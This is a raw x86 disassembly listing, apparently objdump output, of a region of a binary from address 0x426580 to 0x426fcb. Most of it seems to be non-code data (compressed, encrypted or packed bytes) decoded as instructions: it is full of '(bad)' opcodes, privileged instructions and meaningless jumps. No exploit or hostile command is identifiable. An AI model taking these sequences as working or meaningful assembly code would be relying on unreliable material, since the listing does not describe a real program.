  426580:	push   cs
  426581:	das    
  426582:	stos   BYTE PTR es:[edi],al
  426583:	dec    esi
  426584:	jge    0x426584
  426586:	imul   esp,DWORD PTR [edx-0x5313c17d],0x51
  42658d:	inc    esp
  42658e:	sbb    al,0xa4
  426590:	push   ss
  426591:	(bad)  
  426592:	and    DWORD PTR [edx+0x15],ecx
  426595:	pop    esp
  426596:	mov    edx,0x522c44f8
  42659b:	mov    cl,BYTE PTR [ebx-0x70]
  42659e:	xor    BYTE PTR [ecx-0x16],cl
  4265a1:	ins    BYTE PTR es:[edi],dx
  4265a2:	sbb    eax,0x994b2fb4
  4265a7:	gs xchg ecx,eax
  4265a9:	shr    DWORD PTR [ebp+ebp*1-0x4d],1
  4265ad:	cmp    eax,0xd9af3962
  4265b2:	int    0xc9
  4265b4:	arpl   WORD PTR [ebp-0x42ffc237],di
  4265ba:	xor    eax,DWORD PTR [edi]
  4265bc:	sbb    bl,BYTE PTR [ebx-0x644dedc5]
  4265c2:	shl    BYTE PTR [eax+0x23],cl
  4265c5:	ss (bad) 
  4265c8:	push   ebp
  4265c9:	add    ebp,edi
  4265cb:	inc    esi
  4265cc:	push   es
  4265cd:	push   ds
  4265ce:	lods   al,BYTE PTR ds:[esi]
  4265cf:	or     BYTE PTR [esi-0x6995950c],al
  4265d5:	mov    ecx,0xeff2e723
  4265da:	pop    ecx
  4265db:	hlt    
  4265dc:	loop   0x4265b9
  4265de:	lods   eax,DWORD PTR ds:[esi]
  4265df:	inc    eax
  4265e0:	push   edi
  4265e1:	stos   DWORD PTR es:[edi],eax
  4265e2:	xor    BYTE PTR [edi],ch
  4265e4:	push   eax
  4265e5:	addr16 xor eax,0x4ec22ce7
  4265eb:	lahf   
  4265ec:	dec    ecx
  4265ed:	int3   
  4265ee:	imul   edi,DWORD PTR [edx-0x303faaa7],0x2042d372
  4265f8:	push   0x75
  4265fa:	test   eax,0x3fdbe2ea
  4265ff:	xlat   BYTE PTR ds:[ebx]
  426600:	push   esp
  426601:	aas    
  426602:	sbb    bh,BYTE PTR [ebp+0x42327ce8]
  426608:	cdq    
  426609:	or     BYTE PTR [ecx+ebp*1-0x5f],ch
  42660d:	jbe    0x42664f
  42660f:	mov    esp,esp
	...
  426671:	add    BYTE PTR [eax],al
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x33706da4]
  426682:	xchg   edx,eax
  426683:	xchg   esp,eax
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0x2c000001
  42668d:	mov    esi,0x88d9daf5
  426692:	scas   eax,DWORD PTR es:[edi]
  426693:	inc    ebp
  426694:	adc    DWORD PTR [eax+0x44fa1bc4],edx
  42669a:	jo     0x426636
  42669c:	(bad)  
  42669e:	clc    
  42669f:	in     al,dx
  4266a0:	add    BYTE PTR [eax+0x3d],ch
  4266a3:	push   ss
  4266a4:	loopne 0x4266d9
  4266a6:	sub    BYTE PTR [eax+0x3a],bl
  4266a9:	dec    eax
  4266aa:	dec    ebp
  4266ab:	mov    ebx,0x3677ce34
  4266b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266b1:	shl    eax,cl
  4266b3:	add    BYTE PTR [ecx+0x39abb505],0x5b
  4266ba:	mov    ecx,0xfaddeb5e
  4266bf:	retf   0x48fe
  4266c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266c3:	(bad)  
  4266c4:	mov    dl,0x5a
  4266c6:	jle    0x42666a
  4266c8:	add    ah,BYTE PTR [edi+esi*4-0x8]
  4266cc:	bound  ecx,QWORD PTR [ebp+0x1]
  4266cf:	fwait
  4266d0:	mov    bh,0x12
  4266d2:	scas   eax,DWORD PTR es:[edi]
  4266d3:	jecxz  0x4266a7
  4266d5:	dec    edx
  4266d6:	iret   
  4266d7:	shl    DWORD PTR [ebp+0x4f],0x10
  4266db:	addr16 in eax,dx
  4266dd:	lods   al,BYTE PTR ds:[esi]
  4266de:	lock cmp dl,cl
  4266e1:	push   ebp
  4266e2:	repnz pop edx
  4266e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266e5:	mov    edx,0x3370ee95
  4266ea:	pushf  
  4266eb:	jle    0x426676
  4266ed:	dec    eax
  4266ee:	lea    ecx,[ebx-0x4a544c0a]
  4266f4:	cmc    
  4266f5:	xchg   ebp,eax
  4266f6:	add    DWORD PTR [eax],eax
  4266f8:	ds sti 
  4266fa:	dec    edx
  4266fb:	dec    esp
  4266fc:	push   ss
  4266fd:	pop    ss
  4266fe:	daa    
  4266ff:	and    al,0x25
  426701:	scas   eax,DWORD PTR es:[edi]
  426702:	add    ch,BYTE PTR [ecx+0x48]
  426705:	add    esi,ecx
  426707:	fisubr DWORD PTR [ebx+0x4b5e7c6e]
  42670d:	gs push ebp
  42670f:	push   ds
  426710:	push   0xffffffa0
  426712:	mov    esp,0xd98539cd
  426717:	mov    WORD PTR [eax],ds
  426719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42671a:	gs push eax
  42671c:	xchg   esi,eax
  42671d:	ins    DWORD PTR es:[edi],dx
  42671e:	mov    ebp,0x64455ac2
  426723:	test   BYTE PTR [edx+0x15],0xe7
  426727:	jge    0x426729
  426729:	add    ebp,DWORD PTR cs:[edi+0x433ffa99]
  426730:	(bad)  
  426731:	dec    ebp
  426732:	pop    ds
  426733:	add    BYTE PTR [eax+0x4],al
  426736:	jmp    0x2dbc373e
  42673b:	dec    ecx
  42673c:	add    edx,DWORD PTR gs:[eax+0x556b647c]
  426743:	int    0x86
  426745:	pop    eax
  426746:	daa    
  426747:	mov    ss,WORD PTR [ebp+0x1]
  42674a:	sub    eax,0xef16d718
  42674f:	ins    DWORD PTR es:[edi],dx
  426750:	test   al,0xd7
  426752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426753:	or     edi,ebp
  426755:	loope  0x4266e1
  426757:	mov    edx,0xe0ed9ee3
  42675c:	inc    edi
  42675d:	add    eax,0x12f4e830
  426762:	loop   0x426771
  426764:	leave  
  426765:	in     eax,dx
  426766:	not    BYTE PTR [ecx]
  426768:	and    DWORD PTR [edx-0x43],ebx
  42676b:	jne    0x426703
  42676d:	inc    ebx
  42676e:	outs   dx,BYTE PTR ds:[esi]
  42676f:	xchg   ebp,ecx
  426771:	jmp    0x4267a1
  426773:	push   eax
  426774:	xchg   ecx,eax
  426775:	ds mov edi,0xf63a0111
  42677b:	xchg   edx,eax
  42677c:	cmp    eax,0xe255681e
  426781:	std    
  426782:	shr    BYTE PTR [eax],cl
  426784:	xor    BYTE PTR [esi+0x6b],bh
  426787:	ins    DWORD PTR es:[edi],dx
  426788:	ins    DWORD PTR es:[edi],dx
  426789:	mov    bl,0x68
  42678b:	jb     0x4267b8
  42678d:	fwait
  42678e:	cmp    cl,BYTE PTR [esi]
  426790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	imul   eax,DWORD PTR [ebp+0xe],0xffffffb0
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [ebx-0x6e],al
  42680e:	imul   BYTE PTR [ecx+0x5c155cae]
  426814:	stos   DWORD PTR es:[edi],eax
  426815:	scas   al,BYTE PTR es:[edi]
  426816:	sub    cl,BYTE PTR [ebx+0x4]
  426819:	inc    BYTE PTR [ecx-0x538c8973]
  42681f:	icebp  
  426820:	inc    esp
  426822:	pop    es
  426823:	or     ebx,eax
  426825:	dec    esi
  426826:	jnp    0x4267e3
  426828:	xor    eax,0x58c4c3f9
  42682d:	push   edx
  42682e:	cwde   
  42682f:	xchg   BYTE PTR [edx],ch
  426831:	pop    ebp
  426832:	pop    ss
  426833:	mov    ebx,0xb74f15c2
  426838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426839:	sbb    cl,BYTE PTR [eax+eax*8+0x4c]
  42683d:	fld    DWORD PTR [edx-0x27]
  426840:	sub    al,0x90
  426842:	xchg   ecx,eax
  426843:	test   ah,bl
  426845:	mov    ebx,0xb6722063
  42684a:	sub    ah,BYTE PTR [edx+0x3e129fb0]
  426850:	xchg   ecx,eax
  426851:	iret   
  426852:	add    DWORD PTR [ebx-0x3b],ebp
  426855:	ins    BYTE PTR es:[edi],dx
  426856:	fxch   st(1)
  426858:	sub    DWORD PTR cs:[ecx],0xffffff9a
  42685c:	addr16 push edi
  42685e:	push   ds
  42685f:	mov    eax,0x8a2920e9
  426864:	and    al,0xdf
  426866:	mov    edi,0xeb7130a9
  42686b:	adc    al,0xba
  42686d:	ss loope 0x4268d2
  426870:	sahf   
  426871:	cld    
  426872:	out    0x0,eax
  426874:	test   eax,0x1e655380
  426879:	push   ds
  42687a:	jp     0x426880
  42687c:	shr    edx,0x53
  42687f:	in     eax,dx
  426880:	shl    esp,1
  426882:	push   edi
  426883:	fisubr WORD PTR ds:0xb29e36fb
  426889:	es mov ah,0x75
  42688c:	mov    dl,0x94
  42688e:	add    ebx,esp
  426890:	mov    ecx,0xed8145e
  426895:	or     edi,edi
  426897:	push   eax
  426898:	sub    dl,BYTE PTR [ebp+0x7e]
  42689b:	sub    ch,BYTE PTR [edx-0x4a05e108]
  4268a1:	add    al,0x22
  4268a3:	sub    BYTE PTR [ebp+0x3e],0xae
  4268a7:	call   0xacb52776
  4268ac:	xor    bh,al
  4268ae:	out    dx,eax
  4268af:	jg     0x4268c0
  4268b1:	ror    BYTE PTR es:[eax+eax*2-0x9],1
  4268b6:	repnz fstp TBYTE PTR [edi-0x7b]
  4268ba:	xchg   edx,eax
  4268bb:	ret    
  4268bc:	lea    ecx,[eax]
  4268be:	(bad)  
  4268bf:	jns    0x426923
  4268c1:	push   ss
  4268c2:	fcmovb st,st(4)
  4268c4:	sti    
  4268c5:	mov    esp,0x16e44d94
  4268ca:	push   edx
  4268cb:	sbb    BYTE PTR [ebx-0x532ae526],ah
  4268d1:	jecxz  0x426878
  4268d3:	jle    0x4268a9
  4268d5:	sub    al,0x80
  4268d7:	and    edi,edi
  4268d9:	cmp    ch,0xe3
  4268dc:	fiadd  WORD PTR [eax+0x7b]
  4268df:	adc    eax,0xbaa462d0
  4268e4:	adc    al,0x97
  4268e6:	lahf   
  4268e7:	xchg   BYTE PTR [eax+0x1b488eca],ch
  4268ed:	shr    DWORD PTR [esi-0x7a],1
  4268f0:	fcmovbe st,st(6)
  4268f2:	push   ss
  4268f3:	es push 0xffffffbf
  4268f6:	loope  0x426917
  4268f8:	xor    dh,bh
  4268fa:	lea    ebp,[ecx-0x209bef3f]
  426900:	shr    BYTE PTR [ebx-0x12],cl
  426903:	sahf   
  426904:	lds    edi,FWORD PTR [eax+0x1e]
  426907:	js     0x426940
  426909:	adc    eax,0x87a22da9
  42690e:	icebp  
  42690f:	icebp  
  426910:	pop    ds
	...
  426971:	add    BYTE PTR [eax],al
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    eax,DWORD PTR [esi+0x10]
  426982:	or     al,0xce
  426984:	mov    edi,0x500019c
  426989:	add    DWORD PTR [eax],eax
  42698b:	add    bl,al
  42698d:	sahf   
  42698e:	xchg   ebp,eax
  42698f:	test   eax,0x45faeed1
  426994:	adc    al,ch
  426996:	add    DWORD PTR [edi],ecx
  426998:	nop
  426999:	in     eax,0x9c
  42699b:	sub    BYTE PTR [ebp+0x5e],cl
  42699e:	(bad)  
  42699f:	les    eax,FWORD PTR [ecx-0x57]
  4269a2:	add    BYTE PTR [esi],0x4c
  4269a5:	xor    al,0xaf
  4269a7:	into   
  4269a8:	shr    BYTE PTR [ebx+0x61e1d2cc],1
  4269ae:	adc    eax,edx
  4269b0:	popa   
  4269b1:	mov    esi,0x799763fd
  4269b6:	jge    0x426988
  4269b8:	in     eax,dx
  4269b9:	aam    0x67
  4269bb:	out    dx,al
  4269bc:	fdivr  QWORD PTR ds:0x97cdfeab
  4269c2:	cwde   
  4269c3:	and    edx,ecx
  4269c5:	shl    BYTE PTR [edx-0x22],1
  4269c8:	repnz inc edi
  4269ca:	mov    ds:0xd0530d58,eax
  4269cf:	fadd   DWORD PTR [ebx-0x56ba7dde]
  4269d5:	inc    esi
  4269d6:	push   ebp
  4269d7:	std    
  4269d8:	dec    ecx
  4269d9:	or     dl,bh
  4269db:	mov    edx,0x22863c94
  4269e0:	dec    ebp
  4269e1:	sar    bl,1
  4269e3:	xor    eax,DWORD PTR [edi]
  4269e5:	mov    ds:0x1d58495c,eax
  4269ea:	in     eax,0xe3
  4269ec:	imul   esi,DWORD PTR [eax+0x19ff22ce],0xffffffcf
  4269f3:	push   0xa6182de9
  4269f8:	inc    ebx
  4269f9:	ret    0xd288
  4269fc:	scas   al,BYTE PTR es:[edi]
  4269fd:	inc    ebx
  4269fe:	mov    edx,0xdcd67806
  426a03:	mov    bh,0x8
  426a05:	or     DWORD PTR [ebx-0x3f],0xfffffff4
  426a09:	inc    esi
  426a0a:	mov    esp,DWORD PTR [ebp-0x73d32794]
  426a10:	push   0x281c3b4f
  426a15:	lock lds eax,FWORD PTR [ecx+0x44]
  426a19:	scas   al,BYTE PTR es:[di]
  426a1b:	mov    dh,0xab
  426a1d:	or     BYTE PTR [esi+eiz*2-0xb],cl
  426a21:	test   DWORD PTR [ebx+0x59],ecx
  426a24:	(bad)
  426a28:	nop
  426a29:	test   al,0xd1
  426a2b:	and    bh,BYTE PTR [esi+0x7f36d86d]
  426a31:	sbb    DWORD PTR [edx-0x69],0x2d
  426a35:	test   al,0x58
  426a37:	xchg   esp,eax
  426a38:	cmp    bl,cl
  426a3a:	cdq    
  426a3b:	and    BYTE PTR [esi-0x40],0xfb
  426a3f:	mov    ch,0xf2
  426a41:	int    0xe2
  426a43:	jae    0x426a2f
  426a45:	xlat   BYTE PTR ds:[ebx]
  426a46:	jns    0x4269fd
  426a48:	mov    ebx,0x92091733
  426a4d:	test   ebp,edx
  426a4f:	xor    BYTE PTR ds:[edx],dl
  426a52:	in     eax,0x7a
  426a54:	test   BYTE PTR [edx+edx*8-0x27],bh
  426a58:	inc    esp
  426a59:	mov    ecx,0x21bdb1a9
  426a5e:	aaa    
  426a5f:	xor    DWORD PTR [edx],ecx
  426a61:	cs mov eax,0xa93d2619
  426a67:	sbb    BYTE PTR [eax-0x29],dl
  426a6a:	adc    BYTE PTR [eax-0x47],0x90
  426a6e:	jmp    0xbbf3:0xe3a0b86b
  426a75:	aaa    
  426a76:	cli    
  426a77:	inc    esi
  426a78:	dec    eax
  426a79:	sub    dl,BYTE PTR [edi+0x665eecac]
  426a7f:	mov    ebp,0xc4106802
  426a84:	stc    
  426a85:	sub    al,0x83
  426a87:	out    dx,al
  426a88:	xchg   esi,eax
  426a89:	loope  0x426a73
  426a8b:	xor    ch,BYTE PTR [ecx+0x1d]
  426a8e:	mov    esp,0x20ce
	...
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x60
  426b01:	test   DWORD PTR [eax+0x19dc464],esi
  426b07:	add    BYTE PTR ds:0x97000001,al
  426b0d:	and    DWORD PTR [ecx],eax
  426b0f:	pop    ss
  426b10:	xchg   ebp,eax
  426b11:	jo     0x426b44
  426b13:	loop   0x426ab1
  426b15:	mov    BYTE PTR [edi],ah
  426b17:	jge    0x426b1f
  426b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b1a:	mov    edx,DWORD PTR [ebp+ecx*1+0x723167c0]
  426b21:	pop    ecx
  426b22:	out    dx,eax
  426b23:	pop    edx
  426b24:	mov    al,ds:0x980d233e
  426b29:	mov    BYTE PTR [edx],ch
  426b2b:	ret    0x4
  426b2e:	add    al,0x2c
  426b30:	jo     0x426ab9
  426b32:	enter  0x4d91,0xf1
  426b36:	adc    dl,0x8a
  426b39:	push   0x8cd56db
  426b3e:	and    DWORD PTR [esi+0x293bc68b],0x5a
  426b45:	pop    edi
  426b46:	jg     0x426bb6
  426b48:	loope  0x426b5f
  426b4a:	sub    ebp,esi
  426b4c:	in     al,dx
  426b4d:	sbb    dh,dl
  426b4f:	mov    edx,esi
  426b51:	cmp    edi,DWORD PTR [edi+esi*1]
  426b54:	leave  
  426b55:	ds ret 0xaf87
  426b59:	mov    esi,0xd5612d20
  426b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b5f:	cmc    
  426b60:	lahf   
  426b61:	mov    ch,0x6
  426b63:	mov    esi,0x1c696be
  426b68:	nop
  426b69:	retf   0x8446
  426b6c:	mov    DWORD PTR [edx-0x74abee8c],esp
  426b72:	lods   al,BYTE PTR ds:[esi]
  426b73:	inc    esi
  426b74:	dec    ah
  426b76:	hlt    
  426b77:	cmc    
  426b78:	pop    eax
  426b79:	scas   eax,DWORD PTR es:[edi]
  426b7a:	out    dx,eax
  426b7b:	fcmove st,st(6)
  426b7d:	pop    esi
  426b7e:	test   ah,bl
  426b80:	add    al,0xe8
  426b82:	out    dx,eax
  426b83:	xlat   BYTE PTR ds:[ebx]
  426b84:	retf   0xa038
  426b87:	xchg   esi,eax
  426b88:	cmp    al,BYTE PTR [ecx-0x36]
  426b8b:	test   BYTE PTR [edx+0x40],al
  426b8e:	aaa    
  426b8f:	jno    0x426b20
  426b91:	add    esi,DWORD PTR [ecx-0x6b]
  426b94:	aam    0xb6
  426b96:	scas   al,BYTE PTR es:[edi]
  426b97:	sysret 
  426b99:	xlat   BYTE PTR ds:[ebx]
  426b9a:	xlat   BYTE PTR ds:[ebx]
  426b9b:	mov    ah,0x9b
  426b9d:	in     al,dx
  426b9e:	cmp    eax,0x29eaf8c3
  426ba3:	les    edx,FWORD PTR [ebx+0x1b]
  426ba6:	ds push edx
  426ba8:	mov    WORD PTR [esi],?
  426baa:	add    eax,0x70a3491b
  426baf:	imul   edi,DWORD PTR [esi+0xc40ebce],0x3b
  426bb6:	imul   dx,si,0x9af5
  426bbb:	xchg   ecx,eax
  426bbc:	mov    ds,WORD PTR [edi]
  426bbe:	pop    esi
  426bbf:	push   edx
  426bc0:	jo     0x426c15
  426bc2:	jecxz  0x426b76
  426bc4:	loopne 0x426bfd
  426bc6:	imul   edi,edx,0xdc287ab7
  426bcc:	dec    esi
  426bcd:	dec    edi
  426bce:	xchg   edx,eax
  426bcf:	sub    al,0xed
  426bd1:	xlat   BYTE PTR ds:[ebx]
  426bd2:	mul    BYTE PTR [ecx]
  426bd4:	push   edx
  426bd5:	adc    DWORD PTR [ecx-0x372c3b7],0xfffffff4
  426bdc:	cmp    BYTE PTR [eax],ah
  426bde:	jnp    0x426b7a
  426be0:	sub    al,0xce
  426be2:	cmp    eax,0xc26e67ef
  426be7:	aad    0xed
  426be9:	jae    0x426b70
  426beb:	mov    ecx,0x47dc3cb1
  426bf0:	mov    edx,0xd36fd1e2
  426bf5:	mov    esp,0xe32941f3
  426bfa:	dec    ebp
  426bfb:	cmc    
  426bfc:	sahf   
  426bfd:	sbb    BYTE PTR [edx+0x4d10627c],bh
  426c03:	out    dx,eax
  426c04:	pop    esp
  426c05:	les    esi,FWORD PTR [ebp-0x5e66db44]
  426c0b:	inc    edx
  426c0c:	sub    BYTE PTR ds:0xa8b3,ch
	...
  426c71:	add    BYTE PTR [eax],al
  426c73:	add    dl,ah
  426c75:	pusha  
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xcaddcd5c
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0xb1000001
  426c8d:	sub    esi,esp
  426c8f:	jns    0x426c7d
  426c91:	fsub   QWORD PTR [ebx-0x15]
  426c94:	ins    DWORD PTR es:[edi],dx
  426c95:	mov    ebx,0x2bdf1540
  426c9a:	mov    esp,0x278f328a
  426c9f:	sbb    al,BYTE PTR [eax]
  426ca1:	nop    DWORD PTR [ebp+0x3d]
  426ca5:	loop   0x426c7d
  426ca7:	bnd jle 0x426c71
  426caa:	rcl    BYTE PTR [ebx+0x51],1
  426cad:	push   es
  426cae:	loopne 0x426c66
  426cb0:	lods   al,BYTE PTR ds:[esi]
  426cb1:	lds    esp,FWORD PTR [ecx-0x63]
  426cb4:	iret   
  426cb5:	xor    BYTE PTR [ebp-0x52],0xdf
  426cb9:	pop    ebx
  426cba:	sti    
  426cbb:	or     esp,eax
  426cbd:	pop    esp
  426cbe:	les    ecx,FWORD PTR [ecx+0xe]
  426cc1:	xchg   ebp,eax
  426cc2:	scas   al,BYTE PTR es:[edi]
  426cc3:	xchg   DWORD PTR [ebx],eax
  426cc5:	retf   
  426cc6:	jmp    0xa5228b2a
  426ccb:	jecxz  0x426c69
  426ccd:	sub    ebx,edx
  426ccf:	xchg   ebx,eax
  426cd0:	dec    edx
  426cd1:	push   0x30
  426cd3:	xchg   esi,eax
  426cd4:	add    eax,0x9612c40e
  426cd9:	aam    0xd0
  426cdb:	test   DWORD PTR [eax+0x6a],esi
  426cde:	sbb    ebx,DWORD PTR [ecx-0x203e4c]
  426ce4:	retf   0xe99b
  426ce7:	push   ds
  426ce8:	sbb    al,BYTE PTR ds:0x982e7246
  426cee:	aam    0x72
  426cf0:	mov    dl,0x36
  426cf2:	(bad)  
  426cf3:	push   0x6671349d
  426cf8:	jg     0x426cfd
  426cfa:	stc    
  426cfb:	test   BYTE PTR [esi-0x4886494d],dh
  426d01:	bound  eax,QWORD PTR [ebx+0x3d831004]
  426d07:	push   0xffffff95
  426d09:	mov    dl,0x20
  426d0b:	push   es
  426d0c:	jg     0x426d7a
  426d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d0f:	mov    ds:0xf5cd99c4,eax
  426d14:	adc    BYTE PTR [edx-0x105ac73e],ah
  426d1a:	pop    ebp
  426d1b:	cli    
  426d1c:	xlat   BYTE PTR ds:[ebx]
  426d1d:	imul   ebx,DWORD PTR [edx],0xe770c947
  426d23:	es call 0xdf23:0xa09b90f4
  426d2b:	mov    ecx,0xeca2a16a
  426d30:	sahf   
  426d31:	frstor [edi+0x52]
  426d34:	xchg   edi,eax
  426d35:	or     eax,0x430ffd8
  426d3a:	jecxz  0x426d4e
  426d3c:	loop   0x426d36
  426d3e:	nop
  426d3f:	pop    ds
  426d40:	adc    al,0xa6
  426d42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d43:	shl    DWORD PTR [edx],cl
  426d45:	xchg   edi,eax
  426d46:	daa    
  426d47:	sub    bh,ch
  426d49:	and    DWORD PTR [ebp-0x2d],0x428f6b69
  426d50:	in     eax,dx
  426d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d52:	pop    es
  426d53:	popa   
  426d54:	add    edi,ebp
  426d56:	ret    
  426d57:	je     0x426d28
  426d59:	sub    ecx,DWORD PTR [edi+ebx*2-0x7a]
  426d5d:	pop    esp
  426d5e:	mov    ds:0x44efb193,al
  426d63:	scas   al,BYTE PTR es:[edi]
  426d64:	mov    WORD PTR [ebx],?
  426d66:	mov    ch,BYTE PTR [ecx-0x4233d4e6]
  426d6c:	sbb    eax,DWORD PTR [edi-0x18]
  426d6f:	jmp    0x426de3
  426d71:	mov    ds:0xdeb6b954,eax
  426d76:	xor    BYTE PTR [esi],0x0
  426d79:	fs dec ecx
  426d7b:	mov    eax,ds:0x30253875
  426d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d81:	add    BYTE PTR [ecx],dl
  426d83:	pusha  
  426d84:	out    dx,eax
  426d85:	pop    ebx
  426d86:	mov    ebp,0xa889cf42
  426d8b:	inc    ecx
  426d8c:	mov    cl,0x75
  426d8e:	sub    BYTE PTR [edx],dl
  426d90:	dec    ebp
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xf0c:0xc7c2ecf9
  426e01:	add    BYTE PTR [edi+eiz*8],cl
  426e04:	into   
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0x37000001
  426e0d:	add    esi,DWORD PTR [ebx+0x53]
  426e10:	es mov edx,0xefaf9edd
  426e16:	(bad)  
  426e17:	jmp    0xf13a3c3c
  426e1c:	jae    0x426df3
  426e1e:	fdivrp st(4),st
  426e20:	fidiv  DWORD PTR [ecx+ebx*2]
  426e23:	xor    al,0x11
  426e25:	adc    ah,BYTE PTR [ebx+edi*1]
  426e28:	jmp    0x53d2:0xd64cf963
  426e2f:	les    eax,FWORD PTR [eax-0x7d2908c]
  426e35:	pop    edi
  426e36:	jae    0x426ea9
  426e38:	icebp  
  426e39:	dec    edi
  426e3a:	test   eax,0x24efede5
  426e3f:	call   FWORD PTR [edx+0x63]
  426e42:	(bad)  
  426e43:	bnd jl 0x426e65
  426e46:	xor    dl,BYTE PTR [edx-0x70d18a87]
  426e4c:	(bad)  [esi]
  426e4e:	sbb    bh,BYTE PTR ds:0x883d3177
  426e54:	pop    edi
  426e55:	in     al,0x19
  426e57:	jmp    0xe908:0xce2110b1
  426e5e:	push   esp
  426e5f:	pop    edx
  426e60:	add    al,0x7e
  426e62:	inc    edi
  426e63:	sbb    al,0xfd
  426e65:	cdq    
  426e66:	jbe    0x426ebc
  426e68:	icebp  
  426e69:	mov    al,0xe2
  426e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e6c:	dec    esp
  426e6d:	mov    ds:0xcf4f880e,al
  426e72:	inc    edx
  426e73:	inc    ecx
  426e74:	xor    esi,ebp
  426e76:	std    
  426e77:	sar    DWORD PTR [eax+edi*4-0x4b],0x36
  426e7c:	inc    esp
  426e7d:	xchg   BYTE PTR [ebx],bl
  426e7f:	mov    dl,0xfa
  426e81:	push   es
  426e82:	test   al,0x41
  426e84:	push   0x7b
  426e86:	mov    ebx,ebx
  426e88:	sub    ebp,DWORD PTR [edx-0x2a]
  426e8b:	pushf  
  426e8c:	and    eax,0xbf6cd14c
  426e91:	xor    al,dh
  426e93:	dec    ecx
  426e94:	das    
  426e95:	enter  0x42,0xdd
  426e99:	cmp    dh,dl
  426e9b:	sub    DWORD PTR [eax-0x31],ecx
  426e9e:	mov    edi,0x95de41c9
  426ea3:	cmp    BYTE PTR [eax+0x63],cl
  426ea6:	ret    
  426ea7:	ret    
  426ea8:	sbb    dh,BYTE PTR [ebx]
  426eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426eab:	out    dx,al
  426eac:	bound  esi,QWORD PTR [ebx+0x36b4023]
  426eb2:	aad    0x69
  426eb4:	shr    BYTE PTR [edi-0x40],cl
  426eb7:	xlat   BYTE PTR ds:[ebx]
  426eb8:	scas   eax,DWORD PTR es:[edi]
  426eb9:	mov    BYTE PTR [edi+0x21c3a636],ch
  426ebf:	mov    bl,0x2f
  426ec1:	retf   
  426ec2:	jne    0x426f0b
  426ec4:	icebp  
  426ec5:	jb     0x426eed
  426ec7:	mov    edx,0x8e4f1dfe
  426ecc:	inc    ecx
  426ecd:	add    BYTE PTR [ebx],cl
  426ecf:	push   ebx
  426ed0:	pop    ss
  426ed1:	nop
  426ed2:	pushf  
  426ed3:	mov    ds:0xda2afbfb,eax
  426ed8:	inc    edi
  426ed9:	out    dx,eax
  426eda:	jnp    0x426ef4
  426edc:	dec    ecx
  426edd:	jecxz  0x426e76
  426edf:	ds push esi
  426ee1:	sbb    DWORD PTR [esi+0x1e5c4ef5],0xffffff88
  426ee8:	mov    ds:0x1f9226c6,eax
  426eed:	and    eax,0xc9b8b6ec
  426ef2:	(bad)  
  426ef3:	mov    ebx,0xe7e18f17
  426ef8:	dec    ebp
  426ef9:	ins    DWORD PTR es:[edi],dx
  426efa:	fwait
  426efb:	xchg   ecx,eax
  426efc:	push   ebx
  426efd:	cdq    
  426efe:	inc    edx
  426eff:	(bad)  
  426f00:	sub    eax,DWORD PTR [ecx+0x25]
  426f03:	lea    ebx,[eax-0x1e]
  426f06:	mov    eax,ds:0x380d6c0e
  426f0b:	pop    edi
  426f0c:	popf   
  426f0d:	pop    ecx
  426f0e:	dec    esi
  426f0f:	into   
  426f10:	inc    edi
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ebp+edx*1-0x2cc4bc8d],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	fdivr  st,st(1)
  426f8e:	mov    edi,0x968cdcf1
  426f93:	shl    DWORD PTR [ebp-0x6228852b],1
  426f99:	or     eax,0x2eb5e891
  426f9e:	or     BYTE PTR [edx+0x21],0x80
  426fa2:	mov    al,ds:0x24453a28
  426fa7:	add    DWORD PTR [eax+0x76db7e2f],0x5db766bf
  426fb1:	dec    esp
  426fb2:	push   edi
  426fb3:	imul   ebp,DWORD PTR [ebp-0x3c],0xb25c013e
  426fba:	adc    eax,0xf4093e1c
  426fbf:	mov    al,0xb3
  426fc1:	test   BYTE PTR [ebx-0x55],dh
  426fc4:	rcl    DWORD PTR [edi*1-0x2505157a],1
  426fcb:	popf   
